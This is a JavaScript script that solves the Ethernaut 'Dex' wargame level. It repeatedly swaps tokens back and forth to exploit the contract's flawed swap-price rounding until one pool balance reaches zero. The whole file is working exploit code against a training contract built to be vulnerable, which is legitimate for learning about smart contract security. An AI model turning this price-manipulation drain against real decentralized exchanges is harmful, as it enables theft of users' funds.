module.exports = async function({ artifacts, web3, ethernaut }) {
  const Dex = artifacts.require('Dex');
  const instanceAddress = await ethernaut.createInstance(web3, 'Dex');

  const sender = await getSenderAddress(web3);
  const dexInstance = await Dex.at(instanceAddress);
  const token1Address = await dexInstance.token1();
  const token2Address = await dexInstance.token2();

  await dexInstance.approve(instanceAddress, 1000);

  let myBalance1, myBalance2, dexBalance1, dexBalance2, swapAmount;

  while (true) {
    myBalance1 = (await dexInstance.balanceOf(token1Address, sender)).toNumber();
    myBalance2 = (await dexInstance.balanceOf(token2Address, sender)).toNumber();
    dexBalance1 = (await dexInstance.balanceOf(token1Address, instanceAddress)).toNumber();
    dexBalance2 = (await dexInstance.balanceOf(token2Address, instanceAddress)).toNumber();

    console.log(`My balance ${myBalance1}:${myBalance2}\nDex balance ${dexBalance1}:${dexBalance2}`);

    if (dexBalance1 == 0 || dexBalance2 == 0) {
      break;
    }

    if (myBalance1 > myBalance2) {
      swapAmount = (await dexInstance.getSwapPrice(token1Address, token2Address, myBalance1)).toNumber();
      swapAmount = swapAmount > dexBalance2 ? Math.floor(dexBalance2 / swapAmount * myBalance1) : myBalance1;
      await dexInstance.swap(token1Address, token2Address, swapAmount);
    } else {
      swapAmount = (await dexInstance.getSwapPrice(token2Address, token1Address, myBalance2)).toNumber();
      swapAmount = swapAmount > dexBalance1 ? Math.floor(dexBalance1 / swapAmount * myBalance2) : myBalance2;
      await dexInstance.swap(token2Address, token1Address, swapAmount);
    }
  }

  return ethernaut.submitInstance(web3, instanceAddress);
};